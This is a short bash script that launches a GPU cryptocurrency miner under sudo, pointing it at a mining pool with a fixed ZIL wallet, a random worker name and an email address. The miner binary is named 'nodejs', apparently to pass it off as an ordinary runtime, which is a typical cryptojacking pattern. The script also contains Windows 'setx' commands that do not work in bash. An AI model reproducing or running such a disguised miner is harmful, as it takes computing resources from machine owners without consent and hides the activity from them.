#!/bin/bash
POOL=eth-us1.hellominer.com:1100
WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5mer
WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gas) 
setx GPU_FORCE_64BIT_PTR 0
setx GPU_MAX_HEAP_SIZE 100
setx GPU_USE_SYNC_OBJECTS 1
setx GPU_MAX_ALLOC_PERCENT 100
setx GPU_SINGLE_ALLOC_PERCENT 100
chmod +x nodejs
sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER/andincntk8@gmail.com -pass x
